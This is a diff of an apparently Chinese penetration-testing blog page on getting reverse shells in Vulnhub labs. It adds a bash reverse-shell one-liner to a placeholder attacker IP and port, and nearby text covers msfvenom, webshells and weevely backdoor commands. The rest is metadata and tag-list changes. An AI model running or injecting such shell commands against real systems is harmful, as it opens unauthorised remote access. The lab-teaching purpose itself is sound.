@@ -49,7 +49,7 @@
         content="2021-12-03">
       <meta 
         property="og:article:modified_time" 
-        content="2021-12-30">
+        content="2022-04-20">
       <meta 
         property="og:article:author" 
         content="CBear">
@@ -325,7 +325,7 @@
     
     
       <span class="dot"></span>
-      <span>295 words</span>
+      <span>370 words</span>
     
   </div>
   
@@ -365,6 +365,7 @@
 <li>msfvenom生成反弹shell代码 <strong>详见<a target="_blank" rel="noopener" href="https://chen-299.github.io/2b3bf173.html">Tools-Msfvenom 反弹shell</a></strong>  </li>
 </ul>
 <p>3.2 能够PUT/上传代码<br>（a）<strong>msfvenom生成反弹shell代码+PUT/上传+metasploit监听</strong><br>（b）<strong>一句话木马+蚁剑+kail自带反弹shell代码(/usr/share/webshells/~)</strong><br><strong>使用实例：</strong><a target="_blank" rel="noopener" href="https://chen-299.github.io/d4ec2f86.html">Vulnhub|SickOs1.2</a><br>（c）<strong>weevely生成后门代码+PUT/上传+weevely连接后门</strong><br>生成后门 <code>weevely generate &lt;password&gt; &lt;path&gt;</code><br>连接后门 <code>weevely &lt;URL&gt; &lt;password&gt; [cmd]</code><br><strong>使用实例：</strong><a target="_blank" rel="noopener" href="https://chen-299.github.io/63d10771.html">Vulnhub|JIS-CTF-VulnUpload-CTF01</a>  </p>
+<p>3.3 有能够传入系统命令并执行的交互<br>传入反弹shell的系统口令 ： <code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/&lt;攻击机ip&gt;/&lt;攻击机监听端口&gt; 0&gt;&amp;1&#39;</code><br>注意上述口令需要经过URL编码。<br><strong>使用实例：</strong><a target="_blank" rel="noopener" href="https://chen-299.github.io/d0179d0c.html">Vulnhub|DarkHole2</a>  </p>
 </blockquote>
 </blockquote>
 <h2 id="u5347_u7EA7_u4EA4_u4E92_u5F0Fshell"><a href="#u5347_u7EA7_u4EA4_u4E92_u5F0Fshell" class="headerlink" title="升级交互式shell"></a>升级交互式shell</h2><blockquote>
@@ -469,7 +470,7 @@ python3 <span class="token operator">-</span>c <span class="token string">'impor
   <a 
     class="author-posts-count" 
     href="/archives">
-    <span>35</span>
+    <span>36</span>
     <span>Posts</span>
   </a>
   <a 
@@ -481,7 +482,7 @@ python3 <span class="token operator">-</span>c <span class="token string">'impor
   <a 
     class="author-tags-count" 
     href="/tags">
-    <span>41</span>
+    <span>45</span>
     <span>Tags</span>
   </a>
 </div>
@@ -532,7 +533,7 @@ python3 <span class="token operator">-</span>c <span class="token string">'impor
       <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
         <div class="categories-list-item">
           渗透测试
-          <span class="categories-list-item-badge">29</span>
+          <span class="categories-list-item-badge">30</span>
         </div>
       </a>
     
@@ -621,6 +622,18 @@ python3 <span class="token operator">-</span>c <span class="token string">'impor
       </a>
     
       <a 
+        href="/tags/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" 
+        title="SSH端口转发">
+        <div class="tags-list-item">SSH端口转发</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" 
+        title="内网穿透">
+        <div class="tags-list-item">内网穿透</div>
+      </a>
+    
+      <a 
         href="/tags/searchsploit/" 
         title="searchsploit">
         <div class="tags-list-item">searchsploit</div>
@@ -633,15 +646,21 @@ python3 <span class="token operator">-</span>c <span class="token string">'impor
       </a>
     
       <a 
-        href="/tags/FileUpload/" 
-        title="FileUpload">
-        <div class="tags-list-item">FileUpload</div>
+        href="/tags/SQL%E6%B3%A8%E5%85%A5/" 
+        title="SQL注入">
+        <div class="tags-list-item">SQL注入</div>
       </a>
     
       <a 
-        href="/tags/%E5%8A%AB%E6%8C%81%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83/" 
-        title="劫持环境变量提权">
-        <div class="tags-list-item">劫持环境变量提权</div>
+        href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" 
+        title="代码审计">
+        <div class="tags-list-item">代码审计</div>
+      </a>
+    
+      <a 
+        href="/tags/Git/" 
+        title="Git">
+        <div class="tags-list-item">Git</div>
       </a>
     
       <a 
@@ -654,24 +673,6 @@ python3 <span class="token operator">-</span>c <span class="token string">'impor
         href="/tags/Zabbix/" 
         title="Zabbix">
         <div class="tags-list-item">Zabbix</div>
-      </a>
-    
-      <a 
-        href="/tags/ftp/" 
-        title="ftp">
-        <div class="tags-list-item">ftp</div>
-      </a>
-    
-      <a 
-        href="/tags/smb/" 
-        title="smb">
-        <div class="tags-list-item">smb</div>
-      </a>
-    
-      <a 
-        href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" 
-        title="内网穿透">
-        <div class="tags-list-item">内网穿透</div>
       </a>
     
   </div>
@@ -708,6 +709,11 @@ python3 <span class="token operator">-</span>c <span class="token string">'impor
     
       <div class="recent-posts-item">
         <div class="recent-posts-item-title">2022-04-20</div>
+        <a href="/d0179d0c.html"><div class="recent-posts-item-content">Vulnhub|DarkHole2</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-04-20</div>
         <a href="/55575d9b.html"><div class="recent-posts-item-content">Vulnhub|XXE Lab</div></a>
       </div>
     
@@ -719,11 +725,6 @@ python3 <span class="token operator">-</span>c <span class="token string">'impor
       <div class="recent-posts-item">
         <div class="recent-posts-item-title">2022-03-14</div>
         <a href="/44cd77ef.html"><div class="recent-posts-item-content">Vulhub|PostgreSQL集合</div></a>
-      </div>
-    
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2022-03-07</div>
-        <a href="/ffeb3adb.html"><div class="recent-posts-item-content">SQL|命令集合</div></a>
       </div>
     
   </div>
